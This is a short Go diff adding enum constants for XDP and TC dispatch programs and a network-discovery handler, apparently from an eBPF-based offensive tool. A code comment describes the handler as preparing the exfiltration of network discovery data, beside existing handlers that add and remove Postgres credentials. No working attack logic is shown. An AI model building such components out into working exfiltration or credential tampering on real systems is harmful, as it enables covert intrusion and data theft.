@@ -63,6 +63,12 @@ const (
 	PutPostgresRoleHandler
 	// DelPostgresRoleHandler is the handler used to remove a set of Postgres credentials
 	DelPostgresRoleHandler
+	// XDPDispatch is the main XDP dispatch program
+	XDPDispatch
+	// TCDispatch is the main TC dispatch program
+	TCDispatch
+	// GetNetworkDiscoveryHandler is the handler used to prepare the exfiltration of network discovery data
+	GetNetworkDiscoveryHandler
 )
 
 // RawSyscallProg is used to define the tail call key of each syscall
